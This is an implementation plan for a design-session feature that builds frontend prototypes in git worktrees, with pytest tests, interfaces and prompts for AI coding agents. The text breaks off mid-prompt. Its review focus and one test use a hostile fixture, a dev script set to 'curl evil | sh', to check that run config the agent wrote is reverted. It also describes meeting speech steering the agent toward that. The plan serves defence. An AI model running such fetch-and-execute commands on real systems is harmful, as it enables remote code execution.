# Design Artefacts Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Live design sessions can build on an existing frontend (git worktree + its own dev server, backend mocked) or a scratch prototype, and every result is an artefact linked both ways to its meeting and browsable in a new Artefacts tab.

**Architecture:** Sidecar gains `codebases.py` (find repos), `worktree.py` (create/commit/revert/install/protect), `artefacts.py` (artefact.json + README note, listing, meeting link) and a recorder `on_transcribed` hook; `session.py` gets a `ui_kind` of `scratch|worktree`. Electron main gains `design-devserver.ts` (runs the worktree's dev script on a free port) and serves any vault artefact folder over `gbproto://`. Renderer gains a Codebase picker in the panel, a worktree mode in `PrototypeFrame`, and `screens/artefacts.tsx`.

**Tech Stack:** Python 3.11+ / FastAPI / pytest; Electron 32 + electron-vite + React 18 + zustand + react-query + Tailwind v4 / vitest; git CLI; `claude -p`.

**Spec:** `docs/superpowers/specs/2026-10-10-design-artefacts-design.md` (builds on `2026-10-10-live-design-session-design.md`).

Worktree: `/Users/jannik/development/nikrich/ghost-brain-live-design`, branch `feat/live-design-session`. **Every shell command must start with `cd /Users/jannik/development/nikrich/ghost-brain-live-design &&`** (subagent git otherwise hits the main checkout). Python: `.venv/bin/python -m pytest`. Desktop: `cd desktop && npm run typecheck && npx vitest run <files> && npm run lint`.

## Deviations from the spec (decided while planning)

- The artefact note is `README.md` **inside** the artefact folder for every kind (worktree artefacts live in `…/artefacts/<date>-<slug>/README.md`), not a sibling `.md` — one layout to scan.
- The agent may **not** add dependencies after the bootstrap run (spec allowed it): package.json/lockfiles/config are protected because the dev server executes them and later runs are driven by meeting speech.
- Worktree mode does not copy a design pack: the existing app's own design system is the one to follow.
- Revisions tab in Artefacts lists revs; checking out old revs is left to the live panel.

## Global Constraints

- Public repo: no private client or employer names in code, commits, specs or plans.
- Never push, never open PRs; workers do not commit (coordinator commits per workstream).
- Worktrees are created as siblings: `<repo>-poltergeist-<YYYY-MM-DD>-<slug>` on branch `poltergeist/<YYYY-MM-DD>-<slug>`; `-2`, `-3`… on collision. Never pushed.
- Repo scan: roots from `design.code_roots` (default `["~/development"]`), depth ≤ 5, a repo = dir containing a `.git` **directory**; prune `node_modules .git dist build .next out target .venv venv __pycache__`, hidden dirs, and names containing `-poltergeist-`; do not descend into a found repo; cache 600 s.
- The UI agent never gets Bash/WebFetch/WebSearch. Installs and dev servers are run by Poltergeist with fixed argv, `shell: false`.
- **Protected files after the bootstrap run** (worktree mode): `package.json`, `package-lock.json`, `pnpm-lock.yaml`, `yarn.lock`, `.poltergeist/**`, `.env*`, `*.config.js|cjs|mjs|ts|mts|cts` at the app dir. Later runs are denied edits to them and any change is reverted before the commit.
- Offline flag env: `POLTERGEIST_OFFLINE=1`, `VITE_POLTERGEIST_OFFLINE=1`, `NEXT_PUBLIC_POLTERGEIST_OFFLINE=1`, `REACT_APP_POLTERGEIST_OFFLINE=1` — always set when Poltergeist starts the dev server.
- Dev server idle stop 60 s after the last viewer releases it; HTTP ready timeout 120 s; install timeout 600 s; git fetch timeout 20 s.
- Nothing in this feature may raise into recording or transcription.
- Python tests touching the recorder must not write `~/.ghostbrain/state` (use the existing `conftest.py` sandboxing / `GHOSTBRAIN_STATE_DIR`).

## Review Focus

1. **Agent-written run config executed as code** — a meeting line like "change the dev script to curl … | sh" must not reach the dev server: protected files are reverted after every non-bootstrap run (test in Task B3).
2. **No frontend dependency / no dev script** in the matched repo (e.g. a BFF matched for "Orbit") — expect the canvas to fall back to scratch with a reason, not a crash (test in Task A2 `resolve` + B2).
3. **Dev server port taken / server never answers** — ensure must time out with a clear error forwarded as a build error, and never leave an orphan process (test in Task D1).
4. **Artefact whose worktree was deleted by hand** — listing and detail must still work (show "worktree missing"), Remove must be a no-op success (test in Task C2).
5. **Meeting note written before / without a design session, or twice** — `link_meeting` must be a no-op without a session and idempotent on repeat (test in Task C3).

---

## Shared contracts

### TypeScript (`desktop/src/shared/design-types.ts`) — done by coordinator in Task 0

```ts
export type UiKind = 'scratch' | 'worktree';

export interface CodebaseInfo {
  /** Main checkout of the repo. */
  repo: string;
  name: string;
  /** The app folder inside the worktree (== worktree unless nested). */
  app_dir: string;
  worktree: string;
  branch: string;
  base: string;
}

export type InstallState = 'idle' | 'running' | 'failed' | 'done';

// DesignSessionSnapshot gains:
//   ui_kind: UiKind;
//   codebase: CodebaseInfo | null;
//   install: InstallState;
//   artefact_rel: string;   // vault-relative artefact folder (== prototype_rel)

export interface CodebaseCandidate {
  path: string;      // absolute
  rel: string;       // relative to its root
  name: string;      // package.json name or folder name
  frontend: boolean;
}

export type ArtefactKind = 'prototype' | 'worktree' | 'board';

export interface ArtefactSummary {
  id: string;            // vault-relative folder path
  title: string;
  kind: ArtefactKind;
  board: boolean;        // has a board too
  date: string;          // YYYY-MM-DD
  context: string;
  project: string | null;
  meeting: string | null;       // meeting title
  meeting_path: string | null;  // vault-relative meeting note
  ui_rev: number;
  board_rev: number;
  codebase: (CodebaseInfo & { missing: boolean }) | null;
}

export interface ArtefactDetail extends ArtefactSummary {
  folder: string;        // absolute artefact folder
  revs: RevInfo[];
  board_model: BoardModel | null;
  design_system: string | null;
}

export type DevServerResult =
  | { ok: true; url: string; errors: string[] }
  | { ok: false; error: string };
```

`DesignLiveEvent` `command` events may now have `command: 'codebase'` with label e.g. `"Using orbit-web"` / `"Couldn't find 'Orbit' — using a scratch prototype"`; extend `DesignCommandKind` with `'codebase'`.

Preload/`GbBridge.design` gains:

```ts
devserver: {
  ensure(worktree: string, appDir: string): Promise<DevServerResult>;
  release(worktree: string): Promise<{ ok: true }>;
};
openPath(path: string, how: 'editor' | 'finder'): Promise<{ ok: boolean; error?: string }>;
```
IPC channels: `gb:design:devserver:ensure`, `gb:design:devserver:release`, `gb:design:open-path`.
`gb:design:build(prototypeDir, rev)` is unchanged but now accepts any folder inside the vault (already true) and `setServedRoot` follows the last build (already true).

### Python interfaces

```python
# ghostbrain/design/codebases.py  (A)
@dataclass(frozen=True)
class Candidate:
    path: Path; rel: str; name: str; frontend: bool
    def to_dict(self) -> dict  # {"path","rel","name","frontend"}
def roots() -> list[Path]                                   # settings.load()["code_roots"], expanded
def scan(roots: list[Path] | None = None, *, max_depth: int = 5, refresh: bool = False) -> list[Candidate]
def search(query: str, *, limit: int = 30) -> list[Candidate]   # substring/token filter for the picker
def resolve(hint: str, candidates: list[Candidate] | None = None, *, frontend: bool = True,
            run: Callable[..., Any] | None = None) -> Candidate | None

# ghostbrain/design/worktree.py  (A)
class WorktreeError(RuntimeError): ...
@dataclass
class Worktree:
    repo: Path; path: Path; branch: str; base: str; app_dir: Path
    def to_dict(self) -> dict   # {"repo","name","app_dir","worktree","branch","base"} (all str)
    @classmethod
    def from_dict(cls, d: dict) -> "Worktree"
def create(repo: Path, *, day: date, slug: str) -> Worktree
def find_app_dir(worktree: Path) -> Path | None             # None = no runnable frontend
def package_manager(app_dir: Path) -> str                  # "npm" | "pnpm" | "yarn"
def install_argv(app_dir: Path) -> list[str]
def install(wt: Worktree, *, log_path: Path, timeout_s: int = 600, runner=None) -> None   # raises WorktreeError
def commit(wt: Worktree, message: str) -> str | None       # None = nothing to commit
def revisions(wt: Worktree) -> list[dict]                  # [{rev, at, summary}] from "rev N:" commits
def revert_to(wt: Worktree, rev: int) -> None              # KeyError when no such rev
def snapshot_protected(wt: Worktree) -> dict[str, str | None]   # rel path -> content (None = absent)
def restore_protected(wt: Worktree, snap: dict[str, str | None]) -> list[str]  # changed paths restored
def deps_changed(wt: Worktree, since_sha: str) -> bool
def remove(wt: Worktree) -> dict   # {"removed": bool, "branch_kept": bool, "reason": str|None}
PROTECTED_GLOBS: tuple[str, ...]

# ghostbrain/design/artefacts.py  (C)
def write(folder: Path, data: dict) -> None      # artefact.json + README.md (atomic)
def load(folder: Path) -> dict | None
def list_artefacts() -> list[dict]               # ArtefactSummary dicts, newest first
def detail(artefact_id: str) -> dict | None      # ArtefactDetail dict
def folder_for(artefact_id: str) -> Path         # ValueError if outside 20-contexts/**/{prototypes,artefacts}/
def link_meeting(wav: Path, note_path: Path) -> bool   # never raises
def remove_worktree(artefact_id: str) -> dict
def eject(artefact_id: str) -> Path

# ghostbrain/recorder/hooks.py  (C)
def on_transcribed(cb: Callable[[Path, Path], None]) -> None
def fire_transcribed(wav: Path, note_path: Path) -> None    # never raises
```

`artefact.json` schema (C writes, B fills from the session):

```json
{"version":1,"title":"Login screen review","kind":"prototype|worktree|board","board":true,
 "date":"2026-10-10","context":"personal","project":null,"design_system":"poltergeist-neutral",
 "meeting":null,"meeting_path":null,"ui_rev":7,"board_rev":0,
 "revs":[{"rev":1,"at":"…","summary":"…"}],"codebase":null,"wav":"/abs/…wav"}
```

---

## Task 0 (coordinator): contract

**Files:** Modify `desktop/src/shared/design-types.ts`, `desktop/src/shared/types.ts`, `desktop/src/preload/index.ts`.

- [ ] Add the TS types above; extend `DesignSessionSnapshot` and `DesignCommandKind`; add `devserver` + `openPath` to `GbBridge.design` and preload (`ipcRenderer.invoke` on the three channels).
- [ ] `cd desktop && npm run typecheck` passes (renderer code not yet using the new fields is fine; fix any fixture objects typed as `DesignSessionSnapshot` in tests by adding `ui_kind:'scratch', codebase:null, install:'idle', artefact_rel:''`).
- [ ] Commit `feat(design): artefacts wire contract`.

---

## Workstream A — sidecar: codebases + worktree

### Task A1: settings `code_roots`

**Files:** Modify `ghostbrain/design/settings.py`, `ghostbrain/api/routes/design_packs.py` (settings model), `desktop/src/shared/design-types.ts` is already updated by Task 0 only for snapshot — add `code_roots: string[]` to `DesignSettings` there too. Test: `tests/test_design_packs.py` (settings tests live there) or a new `tests/test_design_settings.py`.

- [ ] **Test:**
```python
def test_code_roots_default_and_update(tmp_vault):
    from ghostbrain.design import settings
    assert settings.load()["code_roots"] == ["~/development"]
    assert settings.update(code_roots=["~/dev", " "])["code_roots"] == ["~/dev"]
```
- [ ] Run → FAIL; implement (strip blanks, keep order, list of str, ≤ 10 entries); PATCH/PUT settings route accepts `code_roots`; run → PASS.

### Task A2: `codebases.py`

**Files:** Create `ghostbrain/design/codebases.py`, test `tests/test_design_codebases.py`.

- [ ] **Tests** (build a fake tree in `tmp_path`):
```python
def _repo(p, pkg=None):
    (p / ".git").mkdir(parents=True)
    if pkg is not None:
        (p / "package.json").write_text(json.dumps(pkg))

def test_scan_finds_nested_repos_and_prunes(tmp_path):
    _repo(tmp_path / "work" / "orbit-web", {"name": "orbit-web", "dependencies": {"react": "18"}})
    _repo(tmp_path / "work" / "hive" / "repos" / "orbit-bff")
    (tmp_path / "work" / "x" / "node_modules" / "y" / ".git").mkdir(parents=True)
    (tmp_path / "wt-poltergeist-2026-10-10-a").mkdir(); (tmp_path / "wt-poltergeist-2026-10-10-a" / ".git").write_text("gitdir: x")
    (tmp_path / "work" / "orbit-web" / "inner" / ".git").mkdir(parents=True)  # inside a repo: not descended
    found = {c.rel: c for c in codebases.scan([tmp_path], refresh=True)}
    assert set(found) == {"work/orbit-web", "work/hive/repos/orbit-bff"}
    assert found["work/orbit-web"].frontend and found["work/orbit-web"].name == "orbit-web"
    assert not found["work/hive/repos/orbit-bff"].frontend

def test_scan_respects_depth(tmp_path):
    _repo(tmp_path / "a" / "b" / "c" / "d" / "e" / "f")
    assert codebases.scan([tmp_path], max_depth=5, refresh=True) == []

def test_resolve_prefers_frontend_on_token_match(tmp_path):
    cands = [Candidate(tmp_path/"bff", "x/acme-platform-bff-orbit", "acme-platform-bff-orbit", False),
             Candidate(tmp_path/"fe", "x/orbit-web", "orbit-web", True)]
    assert codebases.resolve("Orbit frontend", cands, run=_never).name == "orbit-web"

def test_resolve_uses_llm_to_break_ties(tmp_path):
    cands = [Candidate(tmp_path/"a", "a/claims-web", "claims-web", True),
             Candidate(tmp_path/"b", "b/claims-portal", "claims-portal", True)]
    picked = codebases.resolve("claims", cands, run=_answer({"pick": "b/claims-portal"}))
    assert picked.rel == "b/claims-portal"

def test_resolve_none_when_nothing_matches(tmp_path):
    assert codebases.resolve("Orbit", [Candidate(tmp_path, "x/other", "other", True)], run=_never) is None

def test_resolve_no_frontend_candidate_returns_none_when_frontend_wanted(tmp_path):
    cands = [Candidate(tmp_path/"bff", "x/orbit-bff", "orbit-bff", False)]
    assert codebases.resolve("Orbit frontend", cands, run=_never) is None
```
(`_never` raises if called; `_answer(d)` returns an object whose `.as_json()` is `d`.)
- [ ] Implement:
  - tokens: lowercase split on `[^a-z0-9]+`; synonyms `fe→frontend`, `frontend→fe`, `ui→frontend`, `web→frontend`; drop stop words `the our existing use app repo codebase solution project`.
  - score = |hint tokens ∩ (rel tokens ∪ name tokens)|; candidates with score 0 dropped; when `frontend=True`, drop non-frontend candidates.
  - if exactly one top score → it; if ties → `run(prompt, model="haiku", json_schema={"pick": string|null}, timeout_s=60)` over the top 15 (`rel` + name); invalid/none → None. LLM failure → highest-scoring frontend candidate with the shortest rel.
  - `frontend` = package.json has any of `react next vue svelte @angular/core vite solid-js preact` in deps/devDeps, or a workspace package (`apps/*/package.json`, `packages/*/package.json`) that does.
  - cache: module dict `{tuple(roots): (monotonic, list)}`.
- [ ] Run → PASS.

### Task A3: `worktree.py` create/commit/revisions/revert/remove

**Files:** Create `ghostbrain/design/worktree.py`, test `tests/test_design_worktree.py` using real git in `tmp_path`.

- [ ] **Fixture:** `origin` bare repo + `repo` clone with `package.json` (`{"name":"web","scripts":{"dev":"vite"},"dependencies":{"react":"18"}}`), `src/App.tsx`, `package-lock.json` (`{}`), committed and pushed to `main`; set `user.email/name` via `-c` args or env `GIT_AUTHOR_*`/`GIT_COMMITTER_*`.
- [ ] **Tests:**
```python
def test_create_sibling_worktree_on_new_branch(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="login")
    assert wt.path == repo.parent / f"{repo.name}-poltergeist-2026-10-10-login"
    assert wt.branch == "poltergeist/2026-10-10-login" and wt.base == "origin/main"
    assert (wt.path / ".git").is_file() and (wt.path / "src/App.tsx").exists()
    assert wt.app_dir == wt.path

def test_create_suffixes_on_collision(repo):
    worktree.create(repo, day=date(2026, 10, 10), slug="login")
    wt2 = worktree.create(repo, day=date(2026, 10, 10), slug="login")
    assert wt2.path.name.endswith("-login-2") and wt2.branch.endswith("-login-2")

def test_create_ignores_dirty_main_checkout(repo):
    (repo / "src/App.tsx").write_text("dirty")
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="x")
    assert (wt.path / "src/App.tsx").read_text() != "dirty"

def test_commit_revisions_and_revert(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="r")
    (wt.path / "src/App.tsx").write_text("v1"); worktree.commit(wt, "rev 1: one")
    (wt.path / "src/New.tsx").write_text("n"); (wt.path / "src/App.tsx").write_text("v2"); worktree.commit(wt, "rev 2: two")
    assert [r["rev"] for r in worktree.revisions(wt)] == [1, 2]
    worktree.revert_to(wt, 1)
    assert (wt.path / "src/App.tsx").read_text() == "v1" and not (wt.path / "src/New.tsx").exists()
    with pytest.raises(KeyError):
        worktree.revert_to(wt, 9)

def test_commit_nothing_returns_none(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="n")
    assert worktree.commit(wt, "rev 1: nothing") is None

def test_find_app_dir_nested_workspace(tmp_path):
    (tmp_path / "package.json").write_text('{"name":"root","workspaces":["apps/*"]}')
    (tmp_path / "apps/web").mkdir(parents=True)
    (tmp_path / "apps/web/package.json").write_text('{"scripts":{"dev":"next dev"},"dependencies":{"next":"14"}}')
    (tmp_path / "apps/api").mkdir(parents=True)
    (tmp_path / "apps/api/package.json").write_text('{"scripts":{"dev":"node x"}}')
    assert worktree.find_app_dir(tmp_path) == tmp_path / "apps/web"

def test_find_app_dir_none_without_frontend(tmp_path):
    (tmp_path / "pom.xml").write_text("<project/>")
    assert worktree.find_app_dir(tmp_path) is None

def test_remove_keeps_unmerged_branch(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="rm")
    (wt.path / "src/App.tsx").write_text("v1"); worktree.commit(wt, "rev 1: one")
    out = worktree.remove(wt)
    assert out["removed"] and out["branch_kept"] and not wt.path.exists()

def test_remove_missing_worktree_is_ok(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="gone")
    shutil.rmtree(wt.path)
    assert worktree.remove(wt)["removed"] is True
```
- [ ] Implement with `subprocess.run(["git", "-C", str(dir), ...], capture_output=True, text=True, timeout=…)`, raising `WorktreeError` with stderr tail.
  - base: `git symbolic-ref --short refs/remotes/origin/HEAD` → `origin/main`; else first of `origin/main`, `origin/master` that `rev-parse --verify` accepts; else local `main`/`master`; else `HEAD`. Before that, `git fetch origin <name>` with 20 s timeout, errors ignored.
  - `create`: `git worktree add -b <branch> <path> <base>`; app_dir = `find_app_dir(path) or path`.
  - `commit`: `git add -A`; `git diff --cached --quiet` rc 0 → None; else `git -c user.name=Poltergeist -c user.email=poltergeist@localhost commit -q -m msg` → short sha.
  - `revisions`: like `scaffold._log` on `base..HEAD` with `rev N: ` subjects.
  - `revert_to`: `git read-tree -u --reset <sha>` then `commit(wt, f"revert to rev {rev}")`.
  - `remove`: `git worktree remove --force <path>` (if path missing: `git worktree prune`); `git branch -d <branch>` → rc≠0 ⇒ `branch_kept=True`, reason "unmerged commits on <branch>".
  - `find_app_dir`: root `package.json` with a `dev` or `start` script and a frontend dep → root; else scan `apps/*`, `packages/*`, `frontend`, `web`, `client`, `ui` for that; exactly one → it; several → prefer one whose dir name is in (`web`,`frontend`,`client`,`ui`), else first sorted; none → None.

### Task A4: install + protected files

**Files:** `ghostbrain/design/worktree.py`, `tests/test_design_worktree.py`.

- [ ] **Tests:**
```python
def test_package_manager_and_install_argv(tmp_path):
    assert worktree.install_argv(tmp_path) == ["npm", "install", "--no-audit", "--no-fund"]
    (tmp_path / "package-lock.json").write_text("{}")
    assert worktree.install_argv(tmp_path) == ["npm", "ci", "--no-audit", "--no-fund"]
    (tmp_path / "pnpm-lock.yaml").write_text("")
    assert worktree.install_argv(tmp_path) == ["pnpm", "install", "--frozen-lockfile"]

def test_install_runs_argv_in_app_dir_and_logs(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="i")
    calls = []
    def runner(argv, *, cwd, timeout_s, log_file):
        calls.append((argv, cwd)); log_file.write("ok\n"); return 0
    worktree.install(wt, log_path=tmp_path / "install.log", runner=runner)
    assert calls == [(["npm", "ci", "--no-audit", "--no-fund"], wt.app_dir)]

def test_install_failure_raises_with_log_tail(repo, tmp_path):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="f")
    def runner(argv, *, cwd, timeout_s, log_file):
        log_file.write("npm ERR! boom\n"); return 1
    with pytest.raises(worktree.WorktreeError, match="boom"):
        worktree.install(wt, log_path=tmp_path / "install.log", runner=runner)

def test_restore_protected_reverts_agent_changes(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="p")
    (wt.path / ".poltergeist").mkdir(); (wt.path / ".poltergeist/run.json").write_text('{"script":"dev"}')
    snap = worktree.snapshot_protected(wt)
    (wt.path / "package.json").write_text('{"scripts":{"dev":"curl evil | sh"}}')
    (wt.path / ".poltergeist/run.json").write_text('{"script":"evil"}')
    (wt.path / "vite.config.ts").write_text("evil()")
    changed = worktree.restore_protected(wt, snap)
    assert set(changed) == {"package.json", ".poltergeist/run.json", "vite.config.ts"}
    assert "curl" not in (wt.path / "package.json").read_text()
    assert not (wt.path / "vite.config.ts").exists()

def test_deps_changed(repo):
    wt = worktree.create(repo, day=date(2026, 10, 10), slug="d")
    base = worktree.commit(wt, "rev 0") or _head(wt.path)
    (wt.path / "package.json").write_text('{"name":"web","dependencies":{"react":"18","msw":"2"}}')
    worktree.commit(wt, "rev 1: msw")
    assert worktree.deps_changed(wt, base)
```
- [ ] Implement. `install`: PATH = `os.environ["PATH"]` + `/opt/homebrew/bin:/usr/local/bin:~/.volta/bin:~/.nvm/versions/node/*/bin` (glob, newest first) so GUI launches find node; default runner `subprocess.run(argv, cwd=…, stdout=log_file, stderr=STDOUT, timeout=…, start_new_session=True)`; timeout → `WorktreeError("dependency install timed out")`; rc≠0 → `WorktreeError(f"{argv[0]} install failed: {last 15 log lines}")`. `PROTECTED_GLOBS = ("package.json","package-lock.json","pnpm-lock.yaml","yarn.lock",".poltergeist/**",".env*","*.config.js","*.config.cjs","*.config.mjs","*.config.ts","*.config.mts","*.config.cts")`, evaluated relative to `wt.app_dir` (and worktree root when different). `deps_changed`: `git diff --name-only <sha> HEAD` touches package.json or a lockfile.

---

## Workstream B — sidecar: session worktree mode, commands, agent, routes

Owns `ghostbrain/design/{session,commands,ui_agent,listener}.py`, `ghostbrain/api/models/design.py`, `ghostbrain/api/routes/design.py` (session + codebase routes only), tests `tests/test_design_{session,commands,agents}.py`, `ghostbrain/api/tests/test_design_routes.py`. Consumes A and C interfaces exactly as declared above (C's `artefacts.write(folder, data)`).

### Task B1: `codebase` in command detection

- [ ] **Tests** (`tests/test_design_commands.py`):
```python
def test_detect_returns_codebase_hint_for_start_ui():
    run = _answer({"command": "start_ui", "canvas": "ui", "text": None, "codebase": "Orbit frontend"})
    cmd = commands.detect("", "today we're working on Orbit, use our existing frontend", focus=None, states={}, run=run)
    assert cmd == Command("start_ui", "ui", None, "Orbit frontend")

def test_codebase_dropped_for_other_commands():
    run = _answer({"command": "focus_board", "canvas": "board", "text": None, "codebase": "Orbit"})
    assert commands.detect("", "let's focus on the backend", focus="ui", states={}, run=run).codebase is None

def test_schema_and_prompt_mention_codebase():
    assert "codebase" in commands.SCHEMA["required"]
    assert "existing" in commands.PROMPT and "codebase" in commands.PROMPT
```
- [ ] `Command` gains `codebase: str | None = None` (default keeps existing call sites). SCHEMA adds `"codebase": {"type": ["string","null"]}` and requires it. Prompt adds: `- codebase: when start_ui asks to build on an existing app/frontend/repo ("today we're working on Orbit, use our existing frontend"), the name of that app as spoken ("Orbit frontend"); otherwise null.` Also add to prefilter: `existing|repo\w*|codebase|extend\w*`.

### Task B2: session worktree mode

**Files:** `ghostbrain/design/session.py`, `tests/test_design_session.py`.

Behaviour:
- New fields: `self.ui_kind = "scratch"`, `self.codebase: Worktree | None`, `self.codebase_hint: str | None`, `self.install = "idle"`, `self._bootstrapped = False`, `self._protected: dict | None`.
- `_dispatch` for `start_ui` with `cmd.codebase` (spoken) and canvas ui off/never materialized → `self._choose_codebase(hint)` before `_activate("ui")`:
  - `cand = codebases.resolve(hint, codebases.scan())` (exceptions → None).
  - None → stay scratch, publish `{"type":"command","command":"codebase","canvas":"ui","label":f"Couldn't find '{hint}' — using a scratch prototype","undo_token":None,"spoken":True}`.
  - else set `self._codebase_repo = cand.path`, label `f"Using {cand.name}"` (undo token restores scratch).
- `set_codebase(path: str | None)` (button; only before the first UI rev, else `SessionError("The prototype already has revisions — start a new session to switch codebase")`): validates `path` is one of `codebases.scan()` paths (else `ValueError`), sets `_codebase_repo` or scratch, re-plans folder, persists, snapshot.
- `_plan_dir`: worktree mode → `20-contexts/<ctx>/[projects/<slug>/]artefacts/<date>-<slug>`; scratch unchanged.
- `_materialize`: scratch unchanged. Worktree: `folder.mkdir(parents=True)`; `git init` + empty commit there via `scaffold.init_meta(folder)` (add this tiny helper to scaffold.py: `git init -q`, `.gitignore` with `dist/`, commit `rev 0: session`); then `self.codebase = worktree.create(repo, day=self._today, slug=<slug>)`; if `worktree.find_app_dir(self.codebase.path) is None` → remove worktree, raise `_Unavailable("No runnable frontend (package.json with a dev script) in <name>")`. Then queue `_prepare_worktree` on the worker (state `install="running"`).
- `_run("ui")` worktree mode: if `not self._bootstrapped`: install (if `install != "done"`) then run bootstrap (`ui_agent.run_ui(app_dir, mode="bootstrap", …)`), snapshot protected, commit `rev 1: <summary>` (bootstrap counts as rev 1), `_bootstrapped=True`; buffered talk stays for the next run (re-schedule if buffer non-empty). Later runs: `ui_agent.run_ui(app_dir, mode="worktree", …)`, then `changed = worktree.restore_protected(wt, self._protected)`; if changed, append to summary `" (kept run config unchanged: …)"`; commit `rev N: summary`; if `worktree.deps_changed(...)` (bootstrap only) → reinstall.
- Install failure → canvas `unavailable`, reason `"Dependency install failed: …"`, `install="failed"`.
- revert in worktree mode → `worktree.revert_to(self.codebase, rev)`.
- `snapshot()` adds `ui_kind`, `codebase` (`wt.to_dict()` or None), `install`, `artefact_rel` (== `prototype_rel`).
- `_persist_state`/`restore` carry `ui_kind`, `codebase` (dict), `install`, `bootstrapped`, `protected`.
- `end()` / index: replace `_write_index` with `artefacts.write(self._dir, self._artefact_data())` where `_artefact_data()` builds the schema above (`kind`: `"worktree"` if worktree, `"prototype"` if ui rev>0, else `"board"`; `board: board.rev>0`; `wav: str(self.wav)`). Also call it after every revision (cheap; keeps Artefacts tab current mid-meeting).
- eject: scratch only (`SessionError` in worktree mode).

- [ ] **Tests** (fakes: monkeypatch `codebases.resolve/scan`, `worktree.create/find_app_dir/install/commit/revert_to/snapshot_protected/restore_protected/deps_changed`, `ui_agent.run_ui`, `artefacts.write`):
```python
def test_spoken_start_with_codebase_uses_worktree(tmp_path, fakes, wt_fakes, vault):
    s = make(tmp_path)
    fakes.detect_answer = Command("start_ui", "ui", None, "Orbit frontend")
    s.on_segment(seg(1, "today we're working on Orbit, use our existing frontend"))
    snap = s.snapshot()
    assert snap["ui_kind"] == "worktree" and snap["codebase"]["name"] == "orbit-web"
    assert "/artefacts/2026-10-10-" in snap["prototype_dir"]
    s.run_pending()
    assert wt_fakes.installs == 1
    assert fakes.ui_calls[0]["mode"] == "bootstrap"
    assert snap_rev(s) == 1

def test_unknown_codebase_falls_back_to_scratch_with_toast(tmp_path, fakes, wt_fakes):
    wt_fakes.resolve_to = None
    s = make(tmp_path); events = collect(s)
    fakes.detect_answer = Command("start_ui", "ui", None, "Orbit")
    s.on_segment(seg(1, "use our existing Orbit frontend"))
    assert s.snapshot()["ui_kind"] == "scratch"
    assert any(e.get("command") == "codebase" and "Couldn't find 'Orbit'" in e["label"] for e in events())

def test_repo_without_frontend_is_unavailable_with_reason(tmp_path, fakes, wt_fakes):
    wt_fakes.app_dir = None
    s = make(tmp_path)
    s.set_codebase(str(wt_fakes.repo))
    with pytest.raises(ds.SessionError, match="No runnable frontend"):
        s.start("ui")

def test_later_runs_restore_protected_files(tmp_path, fakes, wt_fakes):
    wt_fakes.restored = ["package.json"]
    s = started_worktree_session(tmp_path, fakes, wt_fakes)   # helper: start + bootstrap run
    s.nudge("ui", "add a filter"); s.run_pending()
    assert fakes.ui_calls[-1]["mode"] == "worktree"
    assert "kept run config unchanged" in s.snapshot()["canvases"]["ui"]["revs"][-1]["summary"]

def test_install_failure_makes_ui_unavailable(tmp_path, fakes, wt_fakes):
    wt_fakes.install_error = worktree.WorktreeError("npm ci failed: boom")
    s = started_worktree_session(tmp_path, fakes, wt_fakes, bootstrap=False)
    s.run_pending()
    ui = s.snapshot()["canvases"]["ui"]
    assert ui["state"] == "unavailable" and "boom" in ui["reason"] and s.snapshot()["install"] == "failed"

def test_set_codebase_after_first_rev_is_refused(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    with pytest.raises(ds.SessionError, match="already has revisions"):
        s.set_codebase(None)

def test_restore_keeps_worktree_mode(tmp_path, fakes, wt_fakes):
    s = started_worktree_session(tmp_path, fakes, wt_fakes)
    r = ds.DesignSession.restore(s.wav, Path(s.prototype_dir), threaded=False)
    assert r.snapshot()["ui_kind"] == "worktree" and r.snapshot()["codebase"] == s.snapshot()["codebase"]

def test_artefact_written_after_revision_and_end(tmp_path, fakes, artefact_writes):
    s = make(tmp_path); s.start("ui"); s.run_pending(); s.end()
    kinds = [d["kind"] for _, d in artefact_writes]
    assert kinds and kinds[-1] == "prototype" and artefact_writes[-1][1]["ui_rev"] == 1
```
- [ ] Existing tests keep passing (update the `_write_index`-based README test to assert `artefacts.write` data instead).

### Task B3: UI agent modes

**Files:** `ghostbrain/design/ui_agent.py`, `tests/test_design_agents.py`.

- [ ] `run_ui(..., mode: str = "scratch")`; modes:
  - `scratch`: unchanged.
  - `bootstrap`: prompt = BOOTSTRAP task (below), no transcript; tools `Read,Glob,Grep,Edit(./**),Write(./**)`; disallowed `Bash,WebFetch,WebSearch,Edit(.git/**),Write(.git/**)`.
  - `worktree`: prompt = existing transcript/nudges prompt but RULES_WORKTREE (below); disallowed adds the protected globs as `Edit(<glob>)`/`Write(<glob>)`.
- [ ] BOOTSTRAP text:
```
You are preparing an existing frontend app so it can be demoed live with NO backend.
Do all of this, keeping the app unchanged unless the offline flag is set:
1. Find how the app talks to its backend (fetch/axios clients, API modules, GraphQL, auth/session providers).
2. Add an offline mode, enabled when POLTERGEIST_OFFLINE / VITE_POLTERGEIST_OFFLINE / NEXT_PUBLIC_POLTERGEIST_OFFLINE / REACT_APP_POLTERGEIST_OFFLINE is "1" (use the one this stack exposes to the browser): every backend call returns realistic mock data from local mock files; auth is stubbed with a signed-in demo user so protected screens render.
3. Prefer the app's own API layer for mocks. Use MSW only if it is already a dependency.
4. Write .poltergeist/run.json: {"script": "<package.json script that starts the dev server>", "port_flag": "--port" | "-p" | null, "url_path": "/"}.
5. Behind the offline flag, run this snippet once when the app starts (root component effect or HTML entry) so the host can keep scroll position and route between updates:
{HOST_SNIPPET}
Do not add dependencies. Do not change backend URLs used without the flag.
Final message: ONE line summarising what you mocked.
```
  `HOST_SNIPPET` = the same postMessage script main injects for scratch bundles (copy from `design-bundler.ts` `prototypeHtml`; export it from Python as a constant, keep both in step with a comment).
- [ ] RULES_WORKTREE:
```
You are extending an existing frontend app live while a meeting is in progress.
- Follow the app's existing structure, components, styling and conventions; reuse its design system.
